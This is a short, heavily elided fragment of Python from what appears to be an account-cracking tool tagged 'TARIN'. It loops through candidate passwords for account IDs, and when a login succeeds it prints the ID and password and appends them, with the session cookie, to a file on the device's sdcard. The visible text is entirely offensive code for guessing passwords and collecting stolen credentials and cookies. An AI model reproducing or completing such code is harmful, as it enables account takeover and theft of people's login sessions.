...
def randome(idf,pwv,tl):
    ...
    try:
        for pw in pwv:
            ...
            if res == 'LIVE':
                print(f'\r\r{A}[{G1}TARIN-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/TARIN-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
            if res == 'LOCK':
